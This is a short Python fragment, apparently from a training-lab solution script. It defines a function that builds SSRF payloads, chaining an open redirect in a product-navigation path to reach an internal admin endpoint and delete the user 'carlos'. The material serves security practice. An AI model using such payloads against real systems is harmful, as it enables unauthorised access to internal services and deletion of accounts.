...
def delete_user(url):
    payload = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'
    ...
    payload2 = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/'
